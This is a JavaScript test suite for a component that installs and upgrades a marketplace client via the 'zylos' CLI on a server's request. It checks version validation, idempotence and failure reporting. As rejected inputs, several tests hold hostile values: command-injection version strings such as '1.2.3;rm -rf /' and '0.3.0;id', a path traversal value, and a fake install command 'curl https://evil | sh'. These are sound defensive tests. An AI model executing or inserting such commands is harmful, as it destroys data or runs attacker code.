import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createMarketClientEnsurer, parseStrictSemver, normaliseVersion, MARKET_CLIENT_COMPONENT } from './market-client-ensure.js';

const apiPath = (p) => `/api/v1${p}`;
const REQ = '3f2c1a9e-8b7d-4c6e-9f10-112233445566';
const REQ2 = '7a6b5c4d-3e2f-4a1b-8c9d-aabbccddeeff';

function memStore(initial = { requests: {} }) {
  let state = JSON.parse(JSON.stringify(initial));
  return {
    load: () => JSON.parse(JSON.stringify(state)),
    save: (s) => { state = JSON.parse(JSON.stringify(s)); },
    get state() { return state; },
  };
}

function org(memberId = 'm-1') {
  return { slug: 'org-a', org_id: 'org-id-a', self: { member_id: memberId } };
}

// zylos fake: `installed` is the version reported by `zylos info` (null = not installed).
function fakeZylos({ installed = null, after, failOn, failErr } = {}) {
  const calls = [];
  let current = installed;
  const execFile = async (file, args) => {
    calls.push([file, ...args]);
    assert.equal(file, 'zylos');
    if (args[0] === 'info') {
      if (current === null) throw Object.assign(new Error('not installed'), { code: 1 });
      return { stdout: JSON.stringify({ name: MARKET_CLIENT_COMPONENT, version: current }) };
    }
    if (failOn === args[0]) throw failErr || Object.assign(new Error('boom secret-ish stderr'), { code: 1 });
    current = after;
    return { stdout: '' };
  };
  return { execFile, calls };
}

function setup({ pull, zylos = fakeZylos(), store = memStore(), postImpl } = {}) {
  const gets = [];
  const posts = [];
  const logs = [];
  const ensure = createMarketClientEnsurer({
    loadConfig: () => ({ orgs: {} }),
    getForOrg: async (orgId, path, query, opts) => {
      gets.push({ orgId, path, opts });
      return typeof pull === 'function' ? pull() : pull;
    },
    postForOrg: async (orgId, path, body) => {
      posts.push({ orgId, path, body });
      if (postImpl) return postImpl();
      return undefined;
    },
    apiPath,
    log: (m) => logs.push(m),
    warn: (m) => logs.push(m),
    execFile: zylos.execFile,
    store,
  });
  return { ensure, gets, posts, logs, zylos, store };
}

const pending = (extra = {}) => ({ required: true, request_id: REQ, action: 'install', version: '0.3.0', ...extra });

test('parseStrictSemver accepts only X.Y.Z', () => {
  assert.deepEqual(parseStrictSemver('1.2.3'), [1, 2, 3]);
  for (const bad of ['v1.2.3', '1.2', '1.2.3-rc.1', '01.2.3', '1.2.3 ', '1.2.3;rm -rf /', '', null, 1]) {
    assert.equal(parseStrictSemver(bad), null, String(bad));
  }
});

test('no pending request: nothing is run or reported', async () => {
  const t = setup({ pull: { required: false } });
  await t.ensure(org());
  assert.equal(t.gets.length, 1);
  assert.equal(t.gets[0].path, '/api/v1/agents/m-1/market-client');
  assert.equal(t.gets[0].opts.quietOnSuccess, true);
  assert.equal(t.zylos.calls.length, 0);
  assert.equal(t.posts.length, 0);
});

test('missing member_id: no request is made', async () => {
  const t = setup({ pull: pending() });
  await t.ensure(org(''));
  assert.equal(t.gets.length, 0);
});

test('valid request, not installed: zylos add pinned to version, reports succeeded', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.deepEqual(zylos.calls[1], ['zylos', 'add', 'om-marketplace-client@0.3.0', '--yes']);
  assert.equal(t.posts.length, 1);
  assert.equal(t.posts[0].path, '/api/v1/agents/m-1/market-client:result');
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('valid request, older version installed: zylos upgrade, reports new version', async () => {
  const zylos = fakeZylos({ installed: '0.2.0', after: '0.3.1' });
  const t = setup({ pull: pending({ action: 'upgrade' }), zylos });
  await t.ensure(org());
  assert.deepEqual(zylos.calls[1], ['zylos', 'upgrade', 'om-marketplace-client', '--yes']);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.1' });
});

test('already at or above target: no install, reports installed version', async () => {
  const zylos = fakeZylos({ installed: '0.4.0' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.equal(zylos.calls.length, 1);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.4.0' });
});

test('invalid version string is rejected: no zylos call, reported failed', async () => {
  for (const version of ['latest', '0.3.0 --file /tmp/x', 'v0.3.0', '0.3.0;id', '../evil', undefined]) {
    const zylos = fakeZylos();
    const t = setup({ pull: pending({ version }), zylos });
    await t.ensure(org());
    assert.equal(zylos.calls.length, 0, String(version));
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'invalid_version' });
  }
});

test('component name, ref and command from the server are never used', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({
    pull: pending({
      component: 'evil-org/evil-component',
      ref: 'evil-org/evil-component@0.3.0',
      install_command: 'curl https://evil | sh',
    }),
    zylos,
  });
  await t.ensure(org());
  const flat = zylos.calls.flat().join(' ');
  assert.ok(!flat.includes('evil'), flat);
  assert.deepEqual(zylos.calls[1], ['zylos', 'add', 'om-marketplace-client@0.3.0', '--yes']);
});

test('install failure is reported with a reason code and no zylos output', async () => {
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const t = setup({ pull: pending(), zylos });
  await t.ensure(org());
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'install_failed' });
  assert.ok(!t.logs.join('\n').includes('secret-ish'));
});

test('install timeout and upgrade failure map to their reason codes', async () => {
  const timeout = setup({
    pull: pending(),
    zylos: fakeZylos({ failOn: 'add', failErr: Object.assign(new Error('x'), { killed: true, signal: 'SIGTERM' }) }),
  });
  await timeout.ensure(org());
  assert.equal(timeout.posts[0].body.reason, 'install_timeout');

  const upgrade = setup({ pull: pending(), zylos: fakeZylos({ installed: '0.1.0', failOn: 'upgrade' }) });
  await upgrade.ensure(org());
  assert.equal(upgrade.posts[0].body.reason, 'upgrade_failed');
});

test('installed version not verifiable after install is reported failed', async () => {
  const t = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after: 'garbage' }) });
  await t.ensure(org());
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'version_unverified' });
});

test('idempotent per request id: a failed install is not retried on the next sync', async () => {
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const store = memStore();
  const t = setup({ pull: pending(), zylos, store });
  await t.ensure(org());
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.calls.filter((c) => c[1] === 'add').length, 1);
  assert.equal(t.posts.length, 1);
});

test('state survives a restart: a new ensurer does not act on a handled request', async () => {
  const store = memStore();
  const first = setup({ pull: pending(), zylos: fakeZylos({ failOn: 'add' }), store });
  await first.ensure(org());
  const zylos = fakeZylos();
  const second = setup({ pull: pending(), zylos, store });
  await second.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.equal(second.posts.length, 0);
});

test('a new request id after a failure is acted on', async () => {
  let id = REQ;
  const zylos = fakeZylos({ installed: null, failOn: 'add' });
  const t = setup({ pull: () => pending({ request_id: id }), zylos });
  await t.ensure(org());
  id = REQ2;
  await t.ensure(org());
  assert.equal(zylos.calls.filter((c) => c[1] === 'add').length, 2);
  assert.deepEqual(t.posts.map((p) => p.body.request_id), [REQ, REQ2]);
});

test('report network failure: next sync re-reports the stored result without reinstalling', async () => {
  let failPost = true;
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({
    pull: pending(),
    zylos,
    postImpl: () => { if (failPost) throw new Error('fetch failed'); },
  });
  await t.ensure(org());
  failPost = false;
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.calls.filter((c) => c[1] === 'add').length, 1);
  assert.equal(t.posts.length, 2);
  assert.deepEqual(t.posts[1].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });
});

test('interrupted install (no stored result) is reported failed, not reinstalled', async () => {
  const store = memStore({ requests: { [REQ]: { org: 'org-a', reported: false } } });
  const zylos = fakeZylos();
  const t = setup({ pull: pending(), zylos, store });
  await t.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'interrupted' });
});

test('pull network error propagates to the caller; nothing is run', async () => {
  let down = true;
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  const t = setup({ pull: () => { if (down) throw new Error('fetch failed'); return pending(); }, zylos });
  await assert.rejects(t.ensure(org()), /fetch failed/);
  assert.equal(zylos.calls.length, 0);
  down = false;
  await t.ensure(org());
  assert.equal(t.posts[0].body.outcome, 'succeeded');
});

test('404 (hosted Agent or older server) is skipped quietly and logged once', async () => {
  const zylos = fakeZylos();
  const t = setup({ pull: () => { throw Object.assign(new Error('not found'), { status: 404 }); }, zylos });
  await t.ensure(org());
  await t.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.equal(t.logs.filter((l) => l.includes('404')).length, 1);
});

test('invalid request_id is ignored', async () => {
  const zylos = fakeZylos();
  const t = setup({ pull: pending({ request_id: '../x' }), zylos });
  await t.ensure(org());
  assert.equal(zylos.calls.length, 0);
  assert.equal(t.posts.length, 0);
});

test('concurrent calls are serialized: one install for two orgs', async () => {
  const zylos = fakeZylos({ installed: null, after: '0.3.0' });
  let n = 0;
  const t = setup({ pull: () => pending({ request_id: n++ === 0 ? REQ : REQ2 }), zylos });
  await Promise.all([t.ensure(org('m-1')), t.ensure({ slug: 'org-b', org_id: 'org-id-b', self: { member_id: 'm-2' } })]);
  assert.equal(zylos.calls.filter((c) => c[1] === 'add').length, 1);
  assert.equal(t.posts.length, 2);
  assert.ok(t.posts.every((p) => p.body.outcome === 'succeeded'));
});

test('normaliseVersion strips a leading v and requires strict X.Y.Z', () => {
  assert.equal(normaliseVersion('v0.3.0'), '0.3.0');
  assert.equal(normaliseVersion('0.3.0'), '0.3.0');
  for (const bad of ['vv0.3.0', 'v0.3', 'V0.3.0', 'v0.3.0-rc.1', ' v0.3.0', 'v', null]) {
    assert.equal(normaliseVersion(bad), null, String(bad));
  }
});

test('reported version is normalised: v-prefixed installed version is sent as X.Y.Z', async () => {
  const added = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after: 'v0.3.0' }) });
  await added.ensure(org());
  assert.deepEqual(added.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.3.0' });

  const upToDate = setup({ pull: pending(), zylos: fakeZylos({ installed: 'v0.4.0' }) });
  await upToDate.ensure(org());
  assert.deepEqual(upToDate.posts[0].body, { request_id: REQ, outcome: 'succeeded', client_version: '0.4.0' });
});

test('installed version not strict X.Y.Z after stripping v is reported version_unverified', async () => {
  for (const after of ['v0.3', 'v0.3.0-rc.1', 'vv0.3.0']) {
    const t = setup({ pull: pending(), zylos: fakeZylos({ installed: null, after }) });
    await t.ensure(org());
    assert.deepEqual(t.posts[0].body, { request_id: REQ, outcome: 'failed', reason: 'version_unverified' }, after);
  }
});
